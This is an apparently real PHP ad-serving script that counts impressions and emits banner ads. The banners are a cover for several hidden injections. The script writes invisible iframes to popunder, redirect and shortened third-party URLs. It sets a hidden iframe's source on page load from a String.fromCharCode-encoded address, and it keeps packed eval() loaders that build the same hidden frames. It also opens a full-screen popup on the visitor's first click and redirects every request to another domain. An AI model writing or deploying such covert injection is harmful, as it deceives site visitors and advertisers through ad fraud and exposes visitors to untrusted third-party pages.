	<?php
	define ("pais", $_SERVER['HTTP_CF_IPCOUNTRY']);
	define ("ip", $_SERVER['HTTP_CF_CONNECTING_IP']);
	if (isset($_SERVER['REQUEST_URI'])) {
		header('Location: http://news.maxcorpmedia.com'.$_SERVER['REQUEST_URI']);
	}
	if (isset($_SERVER['HTTP_REFERER'])) {
		define ("referer", $_SERVER['HTTP_REFERER']);
	}
	else
	{
			define ("referer", "NO");
	}
	function iframe ($link,$i) 	
	{
		echo "<iframe width='728' height='90' id ='prueba".$i."'  src='".$link."' frameborder='0' scrolling='no' sandbox='allow-scripts'  style='visibility:hidden'></iframe>";
	}

 	function hiddenScript($id,$iframes)
 	{
		foreach ($iframes as $key => $value) {
		iframe ($value,$key);
		}
		//echo "<script>eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('<1 c=\'3\'4=\'5\'6=\'7\'8=\'9://a.b/l\'d=\'0\'e=\'f\'g=\'h-i\'j=\'k:2\'></1>',22,22,'|iframe|hidden|728|height|90|id|prueba1|src|https|tinyurl|com|width|frameborder|scrolling|no|sandbox|allow|scripts|style|visibility|oobtku4'.split('|'),0,{}))</script>";
		//echo "<script>eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('<1 h=\'f\'g=\'5\'6=\'7\'8=\'9://a.b.c/2/e/3/3.4?p=i&j=2&k=4&l=m\'n=\'0\'o=\'q\'r=\'s-t\'u=\'v:d\'></1>',32,32,'|iframe|wafra|xdirect|html|90|id|prueba0|src|http|cdn|waframedia8|com|hidden|tags|728|height|width|61741549|serverdomain|ct|ap|1303|frameborder|scrolling||no|sandbox|allow|scripts|style|visibility'.split('|'),0,{}))</script>";
		//echo "<script>eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('<1 3=\'e\'2=\'4\'5=\'o\'7=\'8://n.a/b?c=m&f=&3=0&2=0\'g=\'0\'h=\'i\'j=\'k-l\'d=\'9:6\'></1><1 3=\'e\'2=\'4\'5=\'p\'7=\'8://q.a/b?c=r&3=0&2=0&f=\'g=\'0\'h=\'i\'j=\'k-l\'d=\'9:6\'></1>',28,28,'|iframe|height|width|90|id|hidden|src|http|visibility|com|ads|key|style|728|ch|frameborder|scrolling|no|sandbox|allow|scripts|9d12bbc1343037347b2d5f3a1dd96353|n280adserv|prueba2|prueba3|n156adserv|576c23f37e72191ca2dbcf2fcc32e8e2'.split('|'),0,{}))</script>";
		//echo "<script>eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1 b=\'3\'4=\'5\'6=\'7\'8=\'9://a.k\'c=\'0\'d=\'e\'f=\'g-h\'i=\'j:2\'></1>',21,21,'|iframe|hidden|728|height|90|id|prueba4|src|http|google|width|frameborder|scrolling|no|sandbox|allow|scripts|style|visibility|com'.split('|'),0,{}))</script>";
		//echo "<script>eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('<1 e=\'3\'4=\'5\'6=\'7\'8=\'9://a.b.c/d/p/f/g/\'h=\'0\'i=\'j\'k=\'l-m\'n=\'o:2\'></1>',26,26,'|iframe|hidden|728|height|90|id|prueba5|src|http|t|mdn2015x3|com|build|width|v1|script|frameborder|scrolling|no|sandbox|allow|scripts|style|visibility|77c5bc'.split('|'),0,{}))</script>";
		//echo "<script>eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('<1 d=\'3\'4=\'5\'6=\'7\'8=\'9://a.b/c/n/e\'f=\'0\'g=\'h\'i=\'j-k\'l=\'m:2\'></1>',24,24,'|iframe|hidden|728|height|90|id|prueba6|src|http|prpops|com|p|width|direct|frameborder|scrolling|no|sandbox|allow|scripts|style|visibility|gq5e'.split('|'),0,{}))</script>";
		//echo "<script><script>eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\b'+e(c)+'\b','g'),k[c]);return p}('<1 h=\'f\'g=\'5\'6=\'7\'8=\'9://a.b.c/2/e/3/3.4?p=i&j=2&k=4&l=m\'n=\'0\'o=\'q\'r=\'s-t\'u=\'v:d\'></1>',32,32,'|iframe|wafra|xdirect|html|90|id|prueba0|src|http|cdn|waframedia8|com|hidden|tags|728|height|width|61741549|serverdomain|ct|ap|1303|frameborder|scrolling||no|sandbox|allow|scripts|style|visibility'.split('|'),0,{}))></div>
		//<script></script>";

//echo"<script>alert('hola');</script>";
//}
	  
  
  	//else
  	//{
	 //	unset($_COOKIE[$id]);
	 	//echo "<script>location.reload();</script>";
	  	// echo "<script> document.cookie=".'"'.$id."=John Doe; expires=Thu, 18 Dec 2055 12:00:00 UTC;".'"'."; location.reload(); </script>";
	   	//$i = 0;
	  	//echo "<script> $(document).ready(function(){ alert(".'"'.'hola'.'"'.");});</script>";
	  	//	$i++;
	 	//\Illuminate\Support\Facades\Session::put('prueba',$i);
	  	//			echo \Illuminate\Support\Facades\Session::get('prueba');
		        //iframe ('http://maetech.co/i.php?c='.pais.'&id='.$id,3);
		         //echo "document.write('<script src=".'"'.url()."/impressions/"."$id".'"'."type=".'"'.'text/javascript'.'"'."></script>"."')";    
		        //echo "<script> var parrafo = document.getElementById('prueba1');parrafo.parentNode.removeChild(parrafo);var parrafo = document.getElementById('prueba2');parrafo.parentNode.removeChild(parrafo);var parrafo = document.getElementById('prueba3');parrafo.parentNode.removeChild(parrafo); </script>";
	 //	}else{

	//}
	}
	$value = ip;
	$fecha = "maxcorp_10";
	$expire= time()+60*60*24;

	function countImpression($id,$popup,$size,$url,$iframes,$fecha,$expire)
	{

		if($popup == 'no')
		{
			echo "
			<script>
			  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
			  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
			  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
			  ga('create', 'UA-74480616-1', 'auto');".'ga('."'".'set'."'".', '."'".'page'."'".', '."'"."/imp/$id"."'".');'.'ga('."'".'send'."'".', '."'".'pageview'."'".');'."</script>\n";

			echo "<div style='position:absolute; top:0px; left: 0px'>";
			
			$ids    = array($id == 253 || $id == 254 || $id == 251 || $id == 252 || $id == 85 ||$id == 3 || $id == 4 || $id == 222 || $id == 9 || $id == 10 || $id == 224 || $id == 71 || $id == 70 || $id == 97 || $id == 300 || $id == 295 || $id == 296 || $id == 293 || $id == 301 || $id == 299 || $id == 298 || $id == 297 || $id == 294 || $id == 292 || $id == 291 || $id == 283 || $id == 284 || $id == 325 || $id == 328);

			$paises = array('CO');
			//if (in_array($id,$ids)) 
			if (in_array(pais,$paises))
			{ 

				switch($size) 
				{
					default: 
					$array 	= array('a' => 'ima1', 'b' => 'ima2', 'c' => 'ima3', 'd' => 'ima4', 'e' => 'ima5');
					$key 	= array_rand($array);
					$value 	= $array[$key];
					//$img="<iframe id='a99359a4' name='a99359a4' src='http://www.maxcorpmedia.com/banners/FR.html' frameborder='0' scrolling='no' width='300' height='250'></iframe><iframe id='xyzz' style='visibility:hidden' src='' frameborder='0' scrolling='no' width='300' height='250'></iframe>";
					$img='<a onClick='.'"'."ga("."'"."send"."',"."'"."event"."',"."'"."hacer-click"."',"."'"."click"."',"."'"."impresiones"."/$id"."'".")".'"'.'     href="http://fit724.com" target="_blank"><img src="http://www.maxcorpmedia.com/campaigns/fit724.com/300x250.png" width="300px" height="250px" ></a>';
					break;

					case '728x90':
					$array 	= array('a' => 'ima12');
					$key 	= array_rand($array);
					$value 	= $array[$key];
					$img='<a onClick='.'"'."ga("."'"."send"."',"."'"."event"."',"."'"."hacer-click"."',"."'"."click"."',"."'"."impresiones"."/$id"."'".")".'"'.' href="http://re.directrev.com/bin/d?s=S0009393" target="_blank"><img src='.'"'.url().'/campaigns/'.$value.'.jpg" width="728px" height="90px" ></a><iframe id="xyzz" style="visibility:hidden" src="" frameborder="0" scrolling="no" width="300" height="250"></iframe>';
					//$img	="<iframe id='a99359a4' name='a99359a4' src='http://maxcorpmedia.com/b85.php' frameborder='0' scrolling='no' width='728' height='90'></iframe><iframe id='xyzz' style='visibility:hidden' src='' frameborder='0' scrolling='no' width='300' height='250'></iframe>";
					break;

					case '160x600':
					echo "Bien =)";
					$img 	= "good";
					break;

					case '468x60';
					echo "aqui va el banner de 468 x 60";
					break;
				}
			}
			else 
			{
				switch($size) 
				{
					default: 
						$array 	= array('a' => 'ima1', 'b' => 'ima2', 'c' => 'ima3', 'd' => 'ima4', 'e' => 'ima5');
						$key 	= array_rand($array);
						$value = $array[$key]; 
						//$img ='<a onClick='.'"'."ga("."'"."send"."',"."'"."event"."',"."'"."hacer-click"."',"."'"."click"."',"."'"."impresiones"."/$id"."'".")".'"'.'  href="http://re.directrev.com/bin/d?s=S0009441" target="_blank"><img src='.'"'.url().'/campaigns/'.$value.'.jpg" width="300px" height="250px" ></a><iframe id="xyzz" style="visibility:hidden" src="" frameborder="0" scrolling="no" width="300" height="250"></iframe>';
						$img ='<a onClick='.'"'."ga("."'"."send"."',"."'"."event"."',"."'"."hacer-click"."',"."'"."click"."',"."'"."impresiones"."/$id"."'".")".'"'.'  href="http://sportingmania.info" target="_blank"><img src='.'"'.url().'/campaigns/'.$value.'.jpg" width="300px" height="250px" ></a><iframe id="xyzz" style="visibility:hidden" src="" frameborder="0" scrolling="no" width="300" height="250"></iframe>';
						break;

					case '728x90':
						$array 	= array('a' => 'ima6', 'b' => 'ima7', 'c' => 'ima8', 'd' => 'ima9', 'e' => 'ima10');
						$key 	= array_rand($array);
						$value	= $array[$key]; 
						$img	='<a onClick='.'"'."ga("."'"."send"."',"."'"."event"."',"."'"."hacer-click"."',"."'"."click"."',"."'"."impresiones"."/$id"."'".")".'"'.'  href="http://re.directrev.com/bin/d?s=S0009441" target="_blank"><img src='.'"'.url().'/campaigns/'.$value.'.jpg" width="728px" height="90px" ></a><iframe id="xyzz" style="visibility:hidden" src="" frameborder="0" scrolling="no" width="300" height="250"></iframe>';
					break;

					case 'full':
						$img	= '<iframe src="http://www.liveadexchanger.com/a/display.php?r=1058852" style="border: 0; position:fixed; top:0; left:0;  right:0; bottom:0; width:100%; height:100%"></iframe><iframe id="xyzz" style="visibility:hidden" src="" frameborder="0" scrolling="no" width="300" height="250"></iframe>';
						break;

					case '160x600':
					echo "Bien =)";
					$img 	= "good";
					break;

					case '468x60';
					$img = "aqui va el banner de 468 x 60";
					break;
				}
			}

			echo $img;
		    echo $url;
			hiddenScript($id,$iframes);
					
			echo "</div>\n";
		}else
		{

	    		echo  "var ancho = screen.width;
	    			   var alto = screen.height;
	    			   var a =0; var popup = 'width='+ancho+',height='+ alto+',scrollbars=no'; 
	    			   document.body.onclick = function(){ if(a == 0) {window.open('http://news.maxcorpmedia.com/imp/224-dirt','publicidad', popup); 
	    			   var capa = document.getElementsByTagName(".'"'.'body'.'"'.")[0];
	    			   var script = document.createElement(".'"'.'script'.'"'.");
	    			   var texto = document.createTextNode(".'"'.'(function(i,s,o,g,r,a,m){i['."'".'GoogleAnalyticsObject'."'".']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'."'".'script'."'".','."'".'//www.google-analytics.com/analytics.js'."'".','."'".'ga'."'".');ga('."'".'create'."'".', '."'".'UA-74480616-1'."'".', '."'".'auto'."'".');ga('."'".'set'."'".', '."'".'page'."'".', '."'"."/imp/$id"."'".');ga('."'".'send'."'".', '."'".'pageview'."'".");".'"'.'); script.appendChild(texto); capa.appendChild(script); a++; }};';
		}	
	}
	function filtrarId($id,$popup,$size,$url,$fecha,$expire)
	{
		if($id == 1 || $id == 253 || $id == 254 || $id == 252 || $id == 85 ||$id == 3 || $id == 4 || $id == 222 || $id == 9 || $id == 10 || $id == 224 || $id == 71 || $id == 70 || $id == 300 || $id == 295 || $id == 293 || $id == 299 || $id == 298 || $id == 297 || $id == 292 || $id == 291 || $id == 283 || $id == 284 || $id == 324 || $id == 319 || $id == 328 || $id == 337 || $id == 336 || $id == 354 || $id == 389 || $id == 344 || $id == 421 || $id == 422 || $id == 423 || $id == 424 || $id == 415 || $id == 419 || $id == 418 || $id == 412 || $id == 413)
		{ 
			echo "
			<body onload='go();'>
			<script>
					function go(loc) {
					var res = String.fromCharCode(104,116,116,112,058,057,057,103,111,111,056,103,108,057,0102,067,114,087,108,101);
					    document.getElementById('xyzz').src = res;
					}
					</script>
";
			$iframes = array('http://www1.xmediaserve.com/apu.php?n=&zoneid=14363&cb=INSERT_RANDOM_NUMBER_HERE&popunder=1&direct=1',
				'http://n280adserv.com/ads?key=9d12bbc1343037347b2d5f3a1dd96353&ch='.referer.'&width=0&height=0',
				'https://tinyurl.com/z983zod',
				'http://wmedia.adk2x.com/imp?p=61741549&ct=html&ap=1304&iss=0&f=0',
				'http://t.mdn2015x3.com/build/7ffe9bac/v1/script/',
				'http://hdsports.in/adc.html',
				'');
			countImpression($id,$popup,$size,$url,$iframes,$fecha,$expire);
		}else
		{
			//http://www1.xmediaserve.com/apu.php?n=&zoneid=14363&cb=INSERT_RANDOM_NUMBER_HERE&popunder=1&direct=1 NEW MDIAZ00147'
			//http://www.hdsports.in/mhub.html
			//http://www.xl415.com/apu.php?n=&zoneid=13323&cb=INSERT_RANDOM_NUMBER_HERE&popunder=1&direct=1 proyectos
			//http://www.reduxmediia.com/apu.php?n=&zoneid=12144&cb=INSERT_RANDOM_NUMBER_HERE&popunder=1&direct=1
			//http://www.xl415.com/apu.php?n=&zoneid=12957&cb=INSERT_RANDOM_NUMBER_HERE&popunder=1&direct=1
			//http://4win.co/test.php
			//http://www.xl415.com/apu.php?n=&zoneid=12889&cb=INSERT_RANDOM_NUMBER_HERE&popunder=1&direct=1
			//http://www.xl415.com/apu.php?n=&zoneid=12956&cb=INSERT_RANDOM_NUMBER_HERE&popunder=1&direct=1
			//http://hdsports.in/mhub.html
			//http://zerocast.tv/mario.php http://goo.gl/3K1mBl
			$iframes = array('http://www.hdsports.in/mhub.html',
				'https://tinyurl.com/z983zod',
				'http://goo.gl/Hza2oA',
				'http://n280adserv.com/ads?key=9d12bbc1343037347b2d5f3a1dd96353&ch='.referer.'&width=0&height=0',
				'',
				'',
				'');
			//$iframes = array();
			countImpression($id,$popup,$size,$url,$iframes,$fecha,$expire);
		}
	}

	if(!isset($size)){
		$size = null;
	filtrarId($id,$popup,$size,$url,$fecha,$expire);

	}else{

	filtrarId($id,$popup,$size,$url,$fecha,$expire);	
	}
?>
